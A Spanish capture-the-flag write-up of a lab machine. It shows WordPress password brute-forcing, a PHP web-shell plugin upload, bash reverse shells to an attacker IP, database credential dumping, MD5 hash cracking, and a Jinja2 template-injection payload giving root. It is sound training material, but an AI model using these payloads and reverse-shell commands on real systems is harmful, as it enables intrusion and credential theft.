# Hackaton UdG - Reto 2

## Index

- [Flag 1](#flag-1)

- [Flag 2](#flag-2)

- [Flag 3](#flag-3)


### Flag 1 

Lo primero que encontramos es en la ruta `http://<IP>/wp1/` así que nos encontramos ante una máquina con WordPress.

Encontramos el usuario `admin` con la comanda `curl -s -L http://<IP>/wp1/?author=1` y con esta información y mediante fuerza bruta con la herramienta `wpscan` y ejecutando el siguiente comando 

```shell
wpscan --url http://10.0.2.12/wp1/ --passwords /usr/share/wordlists/rockyou.txt --usernames admin --enumerate u --disable-tls-checks > wpscan-pass.txt
``` 
sacamos las credenciales: `admin:spongebob`

> [!NOTE]
> Problema de resolución de DNS, se tuvo que añadir una línea `echo "10.0.2.12 reto02.hackaton" | sudo tee -a /etc/hosts
`

### Flag 2 

Una vez dentro del WordPress como admin y haciendo uso de la sección de Medios podemos subir una `reverse shell`

```shell
echo "<?php system(\$_GET['cmd']); ?>" > shell.php

```
> [!NOTE]
> shell.php
> Lo siento, no tienes permisos para subir este tipo de archivo.

Como de primeras no nos deja subir archivos con esta extensión, pasamos al plan de subir la _reverse shell_ como un plugin de WordPress, este apartado solo acepta archivos de extensión **.zip** así que habrá que crear un "pseudo-plugin" ocn la _reverse shell_ dentro  

```php
<?php
/*
Plugin Name: Shell Plugin
Plugin URI: http://hackaton
Description: Plugin de prueba para ejecución remota.
Version: 1.0
Author: Hacker
Author URI: http://hackaton
*/

if(isset($_GET['cmd'])){
    system($_GET['cmd']);
}
?>

```
después lo pasamo a **.zip**

```shell
zip -r shell-plugin.zip shell-plugin.php

```
lo subimos como plugin y lo activamos. Para hacer la prueba de que funciona, simplemente podemos usar la comanda siguiente:

```shell
curl -s http://reto02.hackaton/wp1/wp-content/plugins/shell-plugin.php?cmd=id | head -n 10

```

lo que nos mostrará el siguiente resultado:

```html
uid=33(www-data) gid=33(www-data) groups=33(www-data)

<!DOCTYPE html>
<html lang="es">
<head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
<meta name='robots' content='noindex, nofollow' />
        <style>img:is([sizes="auto" i], [sizes^="auto," i]) { contain-intrinsic-size: 3000px 1500px }</style>
        <title>Página no encontrada &#8211; HACKATÓN &#8211; RETO 02</title>

```

una vez tenemos nuestro _reverse shell_ metida en el WordPress, la lanzamos mediante el siguiente comando

```shell
curl -s "http://reto02.hackaton/wp1/wp-content/plugins/shell-plugin.php?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/10.0.2.15/4444%200>%261'"

```
> [!NOTE]
> Se han formateado los 'espacios' a '%20' porque nos loas admite.

en otra terminal estabamos escuchando con el comando 


```shell
nc -lvnp 4444
```

obteniendo el siguiente resultado y afirmándonos que estamos dentro de la máquina


```shell
listening on [any] 4444 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.12] 39800
bash: cannot set terminal process group (764): Inappropriate ioctl for device
bash: no job control in this shell
www-data@reto02:/var/www/html/wp1$ whoami
whoami
www-data
www-data@reto02:/var/www/html/wp1$ 

```
comprobamos que hay un usuario al intentar ir al lugar d el primera flag, el usuario es `steve`, pero no tenemos permisos para ver dentro de sus carpetas, pero primero para poder hacer más ineractiva la shell ejecutamos dentro de la shell

```shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```shell
www-data@reto02:/home$ cat /var/www/html/wp1/wp-config.php | grep DB_
cat /var/www/html/wp1/wp-config.php | grep DB_
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wordpress' );
define( 'DB_PASSWORD', '9pXYwXSnap`4pqpg~7TcM9bPVXY&~RM9i3nnex%r' );
define( 'DB_HOST', 'localhost' );
define( 'DB_CHARSET', 'utf8mb4' );
define( 'DB_COLLATE', '' );

```

```shell
www-data@reto02:/home$ mysql -u wordpress -p'9pXYwXSnap`4pqpg~7TcM9bPVXY&~RM9i3nnex%r'
<dpress -p'9pXYwXSnap`4pqpg~7TcM9bPVXY&~RM9i3nnex%r'
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 23511
Server version: 8.0.39-0ubuntu0.24.04.2 (Ubuntu)

Copyright (c) 2000, 2024, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 

```

```shell
mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| performance_schema |
| top_secret         |
| wordpress          |
+--------------------+
4 rows in set (0.03 sec)

mysql> use top_secret;
use top_secret;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+----------------------+
| Tables_in_top_secret |
+----------------------+
| avengers             |
+----------------------+
1 row in set (0.00 sec)

mysql> 

```

```shell
mysql> describe avengers;
describe avengers;
+----------+--------------+------+-----+---------+----------------+
| Field    | Type         | Null | Key | Default | Extra          |
+----------+--------------+------+-----+---------+----------------+
| id       | int          | NO   | PRI | NULL    | auto_increment |
| name     | varchar(100) | NO   |     | NULL    |                |
| username | varchar(100) | NO   | UNI | NULL    |                |
| password | varchar(255) | NO   |     | NULL    |                |
+----------+--------------+------+-----+---------+----------------+

```
```shell
mysql> select * from avengers;
select * from avengers;
+----+--------------+------------+----------------------------------+
| id | name         | username   | password                         |
+----+--------------+------------+----------------------------------+
|  1 | Iron Man     | ironman    | cc20f43c8c24dbc0b2539489b113277a |
|  2 | Thor         | thor       | 077b2e2a02ddb89d4d25dd3b37255939 |
|  3 | Hulk         | hulk       | ae2498aaff4ba7890d54ab5c91e3ea60 |
|  4 | Black Widow  | blackwidow | 022e549d06ec8ddecb5d510b048f131d |
|  5 | Hawkeye      | hawkeye    | d74727c034739e29ad1242b643426bc3 |
|  6 | Steve Rogers | steve      | 723a44782520fcdfb57daa4eb2af4be5 |
+----+--------------+------------+----------------------------------+
6 rows in set (0.01 sec)

```

Para saber que tipo de hash es la contraseña de del usuario `steve` ejecutamos el siguiente comando

```shell
echo "723a44782520fcdfb57daa4eb2af4be5" | hashid

```

obteniendo el siguiente resultado

```shell
Analyzing '723a44782520fcdfb57daa4eb2af4be5'
[+] MD2 
[+] MD5 
[+] MD4 
[+] Double MD5 
[+] LM 
[+] RIPEMD-128 
[+] Haval-128 
[+] Tiger-128 
[+] Skein-256(128) 
[+] Skein-512(128) 
[+] Lotus Notes/Domino 5 
[+] Skype 
[+] Snefru-128 
[+] NTLM 
[+] Domain Cached Credentials 
[+] Domain Cached Credentials 2 
[+] DNSSEC(NSEC3) 
[+] RAdmin v2.x 

```
sacamos que se trata de un MD5 y le pasaremos `John the Ripper` para sacar la contraseña 

```shell
echo "723a44782520fcdfb57daa4eb2af4be5" > hash.txt
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

```

obteniendo que la contraseña es `thecaptain`

```shell
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
thecaptain       (?)     
1g 0:00:00:00 DONE (2025-03-16 00:33) 6.666g/s 5150Kp/s 5150Kc/s 5150KC/s thekidbilly..theadicts1
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 

```

ahora somos el usuario `steve`

```shell
steve@reto02:/home$ whoami
whoami
stevesteve@reto02:/home$ ls  
ls
steve
steve@reto02:/home$ cd steve
cd steve
steve@reto02:~$ ls
ls
user.txt.gpg
steve@reto02:~$ echo "spongebob" | gpg --batch --yes --passphrase-fd 0 --decrypt user.txt.gpg
<atch --yes --passphrase-fd 0 --decrypt user.txt.gpg
gpg: AES256.CFB encrypted data
gpg: encrypted with 1 passphrase
HACK{nSPWReoeWijd0PYyWO5YWfbNp}

```

**Flag 2:** `HACK{nSPWReoeWijd0PYyWO5YWfbNp}`


### Flag 3

comprobamos que servicios corren en local en la máquina
```shell
ss -tulnp | grep 127.0.0.1

tcp   LISTEN  0  128   127.0.0.1:7080       0.0.0.0:*      
tcp   LISTEN  0  70    127.0.0.1:33060      0.0.0.0:*      
tcp   LISTEN  0  151   127.0.0.1:3306       0.0.0.0:*  

```

la entrada de la IP no está sanitizada, y damos con ello en el siguiente ejemplo

```shell
steve@reto02:~$ curl "http://127.0.0.1:7080/?ip=8.8.8.8`whoami`" | tail -n 20
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2625  100  2625    0     0  45618      0 --:--:-- --:--:-- --:--:-- 46052
        <h1>Ejecutar diagnóstico ICMP</h1>
            <form method="GET" action="/" style="margin: 20px; padding: 20px; border: 1px solid #ccc; border-radius: 8px; background-color: #f9f9f9; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1); display: flex; flex-direction: column; width: 100%; max-width: 600px;">
            <label for="ip">
                Dirección IP:
            </label>
            <input type="text" id="ip" name="ip" value="8.8.8.8steve" required>
            <button id="submitButton" type="submit" onclick="this.disabled=true; this.form.submit();">
                Ejecutar
            </button>
        </form>

        
        <pre>
                Error al ejecutar: /usr/bin/ping: 8.8.8.8steve: Name or service not known

        </pre>
        
    </body>
    </html>

```
Vulnerabilidad [SSTI (Server Side Template Injection)](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html)

```shell
steve@reto02:~$ curl "http://127.0.0.1:7080/?ip=%7B%7B7*7%7D%7D"

    <!doctype html>
    <html>
    <head>
        <title>Network toolkit</title>
        <style>
            ...          
        </style>
    </head>
    <body>
        <h1>Ejecutar diagnóstico ICMP</h1>
            <form method="GET" action="/" style="margin: 20px; padding: 20px; border: 1px solid #ccc; border-radius: 8px; background-color: #f9f9f9; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1); display: flex; flex-direction: column; width: 100%; max-width: 600px;">
            <label for="ip">
                Dirección IP:
            </label>
            <input type="text" id="ip" name="ip" value="49" required>
            <button id="submitButton" type="submit" onclick="this.disabled=true; this.form.submit();">
                Ejecutar
            </button>
        </form>

        
        <pre>
                Error al ejecutar: /usr/bin/ping: {{7*7}}: Name or service not known

        </pre>
        
    </body>
    </html>
    steve@reto02:~$ 

```
 
nos devuelve **49** en el `value` con lo que se reafirma la vulnerabilidad SSTI, procedemos a realizar otra prueba y con el siguiente **payload** observamos que nos da `root`, dándonos a saber que se ejecuta a través de root 

```bash
steve@reto02:~$ curl "http://127.0.0.1:7080/?ip=%7B%7Bself._TemplateReference__context.cycler.__init__.__globals__.os.popen(%27whoami%27).read()%7D%7D"

    <!doctype html>
    <html>
    <head>
        ...        
    </head>
    <body>
        <h1>Ejecutar diagnóstico ICMP</h1>
            <form method="GET" action="/" style="margin: 20px; padding: 20px; border: 1px solid #ccc; border-radius: 8px; background-color: #f9f9f9; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1); display: flex; flex-direction: column; width: 100%; max-width: 600px;">
            <label for="ip">
                Dirección IP:
            </label>
            <input type="text" id="ip" name="ip" value="root
" required>
            <button id="submitButton" type="submit" onclick="this.disabled=true; this.form.submit();">
                Ejecutar
            </button>
        </form>

        
        <pre>
                Error al ejecutar: /usr/bin/ping: {{self._TemplateReference__context.cycler.__init__.__globals__.os.popen(&#39;whoami&#39;).read()}}: Name or service not known

        </pre>
        
    </body>
    </html>
    steve@reto02:~$ 

```

así que nos ponemos a escuchar por el puerto 4444 con el comando `nc -lvnp 44444` y con el siguiente **payload** lanzamos una shell

```shell
curl "http://127.0.0.1:7080/?ip=%7B%7Bself._TemplateReference__context.cycler.__init__.__globals__.os.popen(%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/10.0.2.15/4444%200%3E%261%22%27).read()%7D%7D"

```

>[!NOTE]
> **Payload** sin el URL encoding: `{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/TU_IP/9001 0>&1"').read()}}`
> - `{{}}` es una expresión Jinja2 (SSTI).
> - `self._TemplateReference__context.cycler.__init__.__globals__.os.popen('comando')` nos permite acceder a `os.popen()`, el cual ejecuta comando en el sistema.
> - El resto es la shell que redirigimos a nuestra máquina.


y ahora somos root

```shell
listening on [any] 4444 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.12] 47226
bash: cannot set terminal process group (32420): Inappropriate ioctl for device
bash: no job control in this shell
root@reto02:/# 

```
vamos al directorio `/root` y ejecutamos el mismo comando que en la flag 2 para sacar esta

```shell
root@reto02:/etc# cd /root
cd /root
root@reto02:~# ls
ls
root.txt.gpg
root@reto02:~# echo "spongebob" | gpg --batch --yes --passphrase-fd 0 --decrypt root.txt.gpg
<atch --yes --passphrase-fd 0 --decrypt root.txt.gpg
gpg: failed to create temporary file '/root/.gnupg/.#lk0x00006016844ecc40.reto02.hackaton.44588': Not a directory
gpg: keyblock resource '/root/.gnupg/pubring.kbx': Not a directory
gpg: AES256.CFB encrypted data
gpg: encrypted with 1 passphrase
HACK{BJ5gnYgLgTJRJDPsMEF2QC8SQ}

```

**Flag 3:** `HACK{BJ5gnYgLgTJRJDPsMEF2QC8SQ}`



